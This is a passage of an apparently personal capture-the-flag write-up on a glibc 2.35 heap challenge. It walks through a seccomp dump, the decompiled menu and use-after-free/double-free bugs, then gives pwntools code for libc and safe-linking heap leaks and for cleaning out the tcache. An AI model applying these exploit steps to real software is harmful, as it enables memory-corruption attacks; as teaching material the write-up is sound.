</span><span class="code-line"> 0007: 0x15 0x02 0x00 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0010
</span><span class="code-line"> 0008: 0x15 0x01 0x00 0x00000005  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> fstat<span class="token punctuation">)</span> goto 0010
</span><span class="code-line"> 0009: 0x15 0x00 0x01 0x0000003c  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> <span class="token builtin class-name">exit</span><span class="token punctuation">)</span> goto 0011
</span><span class="code-line"> 0010: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW
</span><span class="code-line"> 0011: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL
</span></code></pre></div>
<p>As expected, this only allows 64-bit syscalls <code>(A &lt; 0x4000000)</code>, and of those, only permits <code>read, write, open, fstat, exit</code>. This means that when we do get some form of code execution, we have to open, read, and print the flag, rather than popping a shell with <code>execve</code>. Let’s look at the rest of the menu:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token number">00001478</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>true<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">00001478</span>          <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">00001493</span>          <span class="token class-name">int32_t</span> var_2c
</span><span class="code-line"><span class="token number">00001493</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token string">&quot;%d%*c&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>var_2c<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">00001498</span>          <span class="token class-name">int32_t</span> rax_16 <span class="token operator">=</span> var_2c
</span><span class="code-line"><span class="token number">0000149</span>e          <span class="token keyword">if</span> <span class="token punctuation">(</span>rax_16 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000015</span>bc              <span class="token function">puts</span><span class="token punctuation">(</span>str<span class="token operator">:</span> mem<span class="token punctuation">[</span><span class="token function">inidx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000014</span>a7          <span class="token keyword">else</span>
</span><span class="code-line"><span class="token number">000014</span>a7              <span class="token keyword">if</span> <span class="token punctuation">(</span>rax_16 s<span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000014</span>a7                  <span class="token keyword">break</span>
</span><span class="code-line"><span class="token number">000014</span>b0              <span class="token keyword">if</span> <span class="token punctuation">(</span>rax_16 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000014</span>c5                  <span class="token class-name">int64_t</span> rax_18 <span class="token operator">=</span> <span class="token function">inidx</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000014</span>dd                  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token string">&quot;letter size: &quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000014f</span><span class="token number">8</span>                  <span class="token class-name">uint64_t</span> bytes
</span><span class="code-line"><span class="token number">000014f</span><span class="token number">8</span>                  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token string">&quot;%lu%*c&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytes<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">0000151f</span>                  mem<span class="token punctuation">[</span>rax_18<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">00001532</span>                  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token operator">:</span> <span class="token string">&quot;content: &quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">0000155</span>e                  <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token operator">:</span> mem<span class="token punctuation">[</span>rax_18<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token operator">:</span> bytes<span class="token punctuation">.</span>d<span class="token punctuation">,</span> fp<span class="token operator">:</span> <span class="token constant">stdin</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000014</span>b5              <span class="token keyword">else</span>
</span><span class="code-line"><span class="token number">000014</span>b5                  <span class="token keyword">if</span> <span class="token punctuation">(</span>rax_16 <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000014</span>b5                      <span class="token keyword">break</span>
</span><span class="code-line"><span class="token number">0000158</span>d                  <span class="token function">free</span><span class="token punctuation">(</span>mem<span class="token operator">:</span> mem<span class="token punctuation">[</span><span class="token function">inidx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000015</span>cd      <span class="token function">puts</span><span class="token punctuation">(</span>str<span class="token operator">:</span> <span class="token string">&quot;Invalid choice!&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000015</span>d7      <span class="token function">_exit</span><span class="token punctuation">(</span>status<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">000015</span>d7      noreturn
</span></code></pre></div>
<p><code>inidx()</code> is the function that grabs our index value from <code>stdin</code>. There’s no bug in it, and it crashes the program if we specify an index higher than 15. After setting <code>mem</code> to be an array of <code>char*</code>, we see that the menu does mostly what we expected, except sending a letter is <code>free()</code>-ing that index. It can be pretty easily seen that we have two major bugs here:</p>
<ul>
<li>A read after free</li>
<li>Double free</li>
</ul>
<p>Sending a letter does not null the entry in <code>mem</code>, and there’s no check on the pointers in <code>mem</code> when we read from them. The only thing preventing this from being trivial is an update function that would allow use after free.</p>
<p>Alright, let’s see what we have to work with in terms of other security features. A quick checksec shows:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">Arch:     amd64-64-little
</span><span class="code-line">RELRO:    Full RELRO
</span><span class="code-line">Stack:    Canary found
</span><span class="code-line">NX:       NX enabled
</span><span class="code-line">PIE:      PIE enabled
</span></code></pre></div>
<p>Ah... full protections. That certainly restricts us a lot. Full RELRO means that the Global Offset Table is read only. This prevents us from modifying how the program resolves <code>libc</code> functions when called. Speaking of libc, let’s check the version:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">srg@pop-os:~/CTF/ictf23/mailman$ ./libc.so.6
</span><span class="code-line">GNU C Library <span class="token punctuation">(</span>Ubuntu GLIBC <span class="token number">2.35</span>-0ubuntu3.1<span class="token punctuation">)</span> stable release version <span class="token number">2.35</span>.
</span></code></pre></div>
<p><em>Ha!</em> This is starting to become a very annoying challenge. Not that we could’ve had much luck anyway, <code>seccomp</code> prevents us from using one gadgets of any form, due to the lack of <code>execve</code>, but glibc 2.35 also removes two symbols <code>__free_hook</code> and <code>__malloc_hook</code> which were user defined function pointers that were called before calling <code>free()</code> and <code>malloc()</code>. Not to mention that because of <code>seccomp</code>, we can’t call <code>mmap</code> or <code>mprotect</code> to write our own code. glibc 2.35 also has a few annoying protections in that we’ll detail later.</p>
<p>Finally, I need to setup our pwning environment. I use a tool called <a target="_blank" rel="noopener noreferrer" href="https://github.com/io12/pwninit">pwninit</a>, but there are similar tools out there.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
</span><span class="code-line">
</span><span class="code-line">exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./vuln_patched&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./libc.so.6&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exe
</span></code></pre></div>
<h2 id="leaky-program-"><a href="#leaky-program-" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Leaky Program <a name="leaky"></a></h2>
<p>Ok, enough enumerating, we need to start by getting some leaks. We have no limitations to what size letter we can make (other than one larger 65536, due to <code>M_MMAP_MAX</code>), so we can easily leak an address to libc.</p>
<p>One of the main structures about how <code>malloc</code> manages its free lists, is that large chunks, when freed, go to a list called the <code>unsorted_bin</code>. While they are in these bins, they store pointers to the previous and next blocks of <em>free</em> memory. However, when there is only one block, these pointers point to the <code>main_arena</code>, or the structure that manages all the bins for <code>malloc</code>. <code>main_arena</code> is located in libc, and not the heap. These pointers are placed at the start of the data segment of the chunk, meaning that read after free bug that we have can leak out the libc pointer! If the reason for why a chunk has libc pointers, I’d highly look at the official post about malloc internals on the <a target="_blank" rel="noopener noreferrer" href="https://sourceware.org/glibc/wiki/MallocInternals">sourceware page</a>.</p>
<p>So, to leak libc we need to alloc 2 large chunks, free the first one, then read from that freed chunk. The reason we need to alloc the 2nd chunk is because malloc will try to combine adjacent blocks of free memory to be efficient, and if we leave a free block next to the top chunk (the remaining space of the heap), malloc will just coalesce it on <code>free()</code>.</p>
<p>Because interacting with the menu can be verbose in exploit development, I also wrote some functions in pwntools to abstract away making, reading, and freeing chunks:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">r <span class="token operator">=</span> conn<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># either remote or process</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ALLOCATING: &quot;</span><span class="token punctuation">,</span> idx<span class="token punctuation">)</span>
</span><span class="code-line">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;idx: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;size: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;content: &quot;</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;FREEING: &quot;</span><span class="token punctuation">,</span> idx<span class="token punctuation">)</span>
</span><span class="code-line">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;idx: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;SHOWING: &quot;</span><span class="token punctuation">,</span> idx<span class="token punctuation">)</span>
</span><span class="code-line">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;3&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line">    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;idx: &quot;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">return</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Now, leaking libc, we just follow the steps above. To make sure these chunks don’t end up in smaller bins, we have to make them large, so 1350 bytes was chosen arbitrarily. We’ll have to interact with the smaller bins soon, but just for now, for this leak to work in this way, large-ish chunks are sufficient:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token comment"># Make two large chunks</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1350</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1350</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># Free the first one so bk = main_arena in libc</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">resp <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># parse the libc address in little-endian</span>
</span><span class="code-line">libcaddr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>resp<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># Use offsets found in gdb to compute libc base</span>
</span><span class="code-line">libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libcaddr <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f7c10419ce0</span> <span class="token operator">-</span> <span class="token number">0x7f7c10200000</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Alright, with the libc leak we can now refer to many gadgets and functions with ease. But we still need more. It’s a safe bet to also grab a heap leak, but due to safe linking, the pointers are obfuscated:</p>
<div class="relative"><pre><code class="language-cpp code-highlight"><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PROTECT_PTR</span><span class="token expression"><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> ptr<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">  <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">__typeof</span> <span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> pos<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">REVEAL_PTR</span><span class="token expression"><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span>  <span class="token function">PROTECT_PTR</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token punctuation">,</span> ptr<span class="token punctuation">)</span></span></span>
</span></code></pre></div>
<p>When a block is freed and ends up in one of the faster lists of malloc, it mangles them with the <em>position</em> that it is stored in.</p>
<p>There’s a couple ways to get a leak, but I followed <a target="_blank" rel="noopener noreferrer" href="https://ctftime.org/writeup/34804">this writeup</a> from AeroCTF. If both allocations are in the same page (4096 bytes), then the first 12 bits of <code>pos</code> are 0, since the position is shifted by 12. We can deobfuscate a heap ptr independently using the following function:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">def</span> <span class="token function">deobfuscate</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    mask <span class="token operator">=</span> <span class="token number">0xfff</span> <span class="token operator">&lt;&lt;</span> <span class="token number">52</span>
</span><span class="code-line">    <span class="token keyword">while</span> mask<span class="token punctuation">:</span>
</span><span class="code-line">        v <span class="token operator">=</span> val <span class="token operator">&amp;</span> mask
</span><span class="code-line">        val <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>v <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span>
</span><span class="code-line">        mask <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">12</span>
</span><span class="code-line">    <span class="token keyword">return</span> val
</span></code></pre></div>
<p>This will just give us a heap base address from any leak. There was probably an <a target="_blank" rel="noopener noreferrer" href="https://ret2school.github.io/post/catastrophe/">easier method</a>, but I’m learning as I go.</p>
<p>With that, I was doing some testing so there are unnecessary allocs and frees here (but I’m too afraid to change the script due to offsets)</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token comment">#Grab some blocks</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span> <span class="token comment">#excess</span>
</span><span class="code-line">alloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span> <span class="token comment">#excess</span>
</span><span class="code-line"><span class="token comment"># Place them into the tcache</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
</span><span class="code-line">show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment">#This printed out a heap address</span>
</span><span class="code-line">addr <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment">#Parse, deobfuscate, and set heap base.</span>
</span><span class="code-line">addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
</span><span class="code-line">heap_leak <span class="token operator">=</span> deobfuscate<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># seccomp actually alloc&#x27;d over a page of memory,</span>
</span><span class="code-line"><span class="token comment"># so base was -0x1000 from what I got.</span>
</span><span class="code-line">heap <span class="token operator">=</span> <span class="token punctuation">(</span>heap_leak <span class="token operator">&gt;&gt;</span> <span class="token number">12</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1000</span>
</span></code></pre></div>
<p>From here, we need to talk about what we actually have been interacting with. The tcache is an array of linked lists which store freed chunks on a per-thread basis. The linked lists are indexed in order, and correspond to chunks of size 16-1032 bytes, increments of 16 bytes. This is a speedup in practice, as there is necessary thread safety operations when trying to alloc in general, since heap is shared among threads, where as this is a custom cache for each thread of your program. The big thing comes from the fact that they are terribly exploitable.</p>
<p>However, seccomp alloc&#x27;d and freed a lot of memory prior, so when debugging with pwndbg, I can check the bins with <code>bins</code> or their specific names <code>tcachebins</code>, <code>fastbins</code>, etc. And I noticed that there was a lot of mess before I wanted to start actual exploit development:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line">tcachebins
</span><span class="code-line"><span class="token number">0x20</span> <span class="token punctuation">[</span>  <span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x560865ea1fd0</span> —▸ <span class="token number">0x560865ea2280</span> —▸ <span class="token number">0x560865ea1750</span> —▸ <span class="token number">0x560865ea1e30</span> —▸ <span class="token number">0x560865ea1c90</span> —▸ <span class="token number">0x560865ea1af0</span> —▸
</span><span class="code-line"> <span class="token number">0x560865ea16c0</span> ◂— <span class="token number">0x0</span>
</span><span class="code-line"><span class="token number">0x70</span> <span class="token punctuation">[</span>  <span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x560865ea1990</span> —▸ <span class="token number">0x560865ea1b30</span> —▸ <span class="token number">0x560865ea1cd0</span> —▸ <span class="token number">0x560865ea1e70</span> —▸ <span class="token number">0x560865ea2010</span> —▸ <span class="token number">0x560865ea2190</span> —▸
</span><span class="code-line"> <span class="token number">0x560865ea16e0</span> ◂— <span class="token number">0x0</span>
</span><span class="code-line"><span class="token number">0x80</span> <span class="token punctuation">[</span>  <span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x560865ea18f0</span> —▸ <span class="token number">0x560865ea1a70</span> —▸ <span class="token number">0x560865ea1c10</span> —▸ <span class="token number">0x560865ea1db0</span> —▸ <span class="token number">0x560865ea1f50</span> —▸ <span class="token number">0x560865ea2200</span> —▸
</span><span class="code-line"> <span class="token number">0x560865ea1640</span> ◂— <span class="token number">0x0</span>
</span><span class="code-line"><span class="token number">0x90</span> <span class="token punctuation">[</span>  <span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x560865ea1530</span> —▸ <span class="token number">0x560865ea14a0</span> —▸ <span class="token number">0x560865ea1800</span> —▸ <span class="token number">0x560865ea1770</span> ◂— <span class="token number">0x0</span>
</span><span class="code-line"><span class="token number">0xd0</span> <span class="token punctuation">[</span>  <span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x560865ea1170</span> —▸ <span class="token number">0x560865ea0e40</span> —▸ <span class="token number">0x560865ea0b10</span> —▸ <span class="token number">0x560865ea07e0</span> —▸ <span class="token number">0x560865ea0350</span> ◂— <span class="token number">0x0</span>
</span><span class="code-line"><span class="token number">0xf0</span> <span class="token punctuation">[</span>  <span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x560865ea2080</span> —▸ <span class="token number">0x560865ea1370</span> ◂— <span class="token number">0x0</span>
</span><span class="code-line">fastbins
</span><span class="code-line"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</span><span class="code-line">unsortedbin
</span><span class="code-line">all<span class="token operator">:</span> <span class="token number">0x560865ea15b0</span> —▸ <span class="token number">0x7f8ff5a19ce0</span> <span class="token punctuation">(</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token punctuation">)</span> ◂— <span class="token number">0x560865ea15b0</span>
</span><span class="code-line">smallbins
</span><span class="code-line"><span class="token number">0x20</span><span class="token operator">:</span> <span class="token number">0x560865ea2160</span> —▸ <span class="token number">0x560865ea1fe0</span> —▸ <span class="token number">0x560865ea1e40</span> —▸ <span class="token number">0x560865ea1ca0</span> —▸ <span class="token number">0x560865ea1b00</span> ◂— <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</span><span class="code-line"><span class="token number">0x60</span><span class="token operator">:</span> <span class="token number">0x560865ea1880</span> —▸ <span class="token number">0x7f8ff5a19d30</span> <span class="token punctuation">(</span>main_arena<span class="token operator">+</span><span class="token number">176</span><span class="token punctuation">)</span> ◂— <span class="token number">0x560865ea1880</span>
</span><span class="code-line"><span class="token number">0x70</span><span class="token operator">:</span> <span class="token number">0x560865ea19f0</span> —▸ <span class="token number">0x560865ea1b90</span> —▸ <span class="token number">0x560865ea1d30</span> —▸ <span class="token number">0x560865ea1ed0</span> —▸ <span class="token number">0x7f8ff5a19d40</span> <span class="token punctuation">(</span>main_arena<span class="token operator">+</span><span class="token number">192</span><span class="token punctuation">)</span> ◂— <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</span></code></pre></div>
<p>To remedy this, I just made a bunch of allocs (and leaked memory), until all of the bins were empty (yes, 16 is there twice, dont worry about it):</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Cleaning tcaches + smallbins&quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    alloc<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;A&#x27;</span><span class="token punctuation">)</span>
